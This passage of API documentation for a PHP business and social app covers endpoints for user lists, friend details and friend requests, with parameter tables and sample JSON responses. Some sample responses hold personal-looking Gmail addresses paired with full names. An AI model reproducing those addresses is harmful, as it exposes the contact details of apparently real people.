    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Comment posted sucessfully."</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<?php
     include 'pricing.php';
     include 'get_city.php';
     include 'business_payment.php';
     include 'get_all_offers.php';
     include 'offer_detail.php';
     include 'create_business_offers.php';
     include 'create_business_advertisement.php';
     include 'edit_business_offers.php';
     include 'edit_business_advertisement.php';
     include 'my_offers.php';
     include 'change_offer_status.php';
     include 'change_ads_status.php';
     include 'offer_like.php';
     include 'offer_share.php';
     include 'offer_favorite.php';
     include 'post_offer_comments.php';
     include 'share_offer_with_friends.php';
     
     
?>
<div class="section" id="UserLists">
    <h2>Users Lists
        <a class="headerlink" href="index.php#UserLists" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'UserLists.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>User Lists Details</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'friends/get_UserLists';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
              <tr class="row-even">
                <td>deLatitude</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLongitude</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>searchKey</td>
                <td>optional</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
    <h5>Note</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre>is_friend_status: "0","1","2" (0=Pending,1=Accepted,2=Rejected) </pre>
        </div>
    </div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"3"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@test.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"13.480391442981835"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/user/14691720377171.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/user/14691720377171.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"miralviroja1@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"69.24439142729223"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"7"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Test"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"test@vros.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"132.22478539486022"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"8"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"miralviroja2@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"220.16422967783186"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"44"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@vros2.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"46"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@vros4.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"48"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@vros6.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"11"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"miralviroja5@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/user/14691724451127.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/user/14691724451127.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"14"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Kalpesh Santoki"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"test"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"kalpeshsantoki07@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"17"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Test"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Android3"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"test3@a.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/user/14696241053093.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/user/14696241053093.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"19"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Arjun Malhotra"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"test"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"arjunmalhotra121990@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"21"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Jason Vrane"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"4vrane@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"42"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"test"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"dsfsd"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"dfsd@dfg.fghfg"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"43"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@vros1.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"45"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@vros3.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/user/41/e445adb8b159556ecf4bddaa382e0e85.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/user/41/e445adb8b159556ecf4bddaa382e0e85.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"47"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@vros5.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"49"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@vros7.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/user/49/2d395646c8dd6ec083ac2d625eedc864.jpeg" class="hoverZoomLink">http://localhost:8888/test/businessApp/user/49/2d395646c8dd6ec083ac2d625eedc864.jpeg</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"13"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Test"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Android1"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"test@a.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/user/14696224756362.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/user/14696224756362.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"16"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Test"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Android2"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"test2@a.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"18"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Test"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Android4"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"test4@a.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"20"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Sumit Patel"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"sumit00779@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"41"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@patel.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1212.0424321161697"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/user/41/e445adb8b159556ecf4bddaa382e0e85.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/user/41/e445adb8b159556ecf4bddaa382e0e85.png</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>


<div class="section" id="single_friend_detail">
    <h2>Single Friend Detail
        <a class="headerlink" href="index.php#single_friend_detail" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'single_friend_detail.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Single Friend Detail</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'friends/get_single_friend_detail';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>optional</td>
                <td></td>
            </tr>
              <tr class="row-even">
                <td>deLatitude</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLongitude</td>
                <td>Required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>friend_user_id</td>
                <td>optional</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
    <h5>Note</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre>is_friend_status: "0","1","2" (0=Pending,1=Accepted,2=Rejected) </pre>
        </div>
    </div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"47"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"renish@vros5.com"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"Mile"</span>,</div></li><li><div class="hoverable"><span class="property">is_friend_status</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"1178.4186053031558"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">""</span></div></li></ul>}</div></li></ul>]</div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>

<div class="section" id="sentRequests">
    <h2>Sent Friends Request
        <a class="headerlink" href="index.php#sentRequests" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'sentRequests.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Sent Friends Request </p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'friends/send_friendsRequests';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td>receiver user ID</td>
            </tr>
              <tr class="row-even">
                <td>touser_id</td>
                <td>Required</td>
                <td>sender user id</td>
            </tr>
             <tr class="row-even">
                <td>is_friend</td>
                <td>Required</td>
                <td>(0=Pending,1=Accepted,2=Rejected)</td>
            </tr>
            
        </tbody>
    </table>
</div>
  
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
<div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Request sent Successfully."</span></div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>


<div class="section" id="friendsRequestLists">
    <h2>Friends Request Lists
        <a class="headerlink" href="index.php#friendsRequestLists" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'friendsRequestLists.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Get Friends and Friend's Request </p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'friends/friends_requestLists';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>user_id</td>
                <td>Required</td>
                <td></td>
            </tr>
              <tr class="row-even">
                <td>deLatitude</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLongitude</td>
                <td>Required</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
   
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
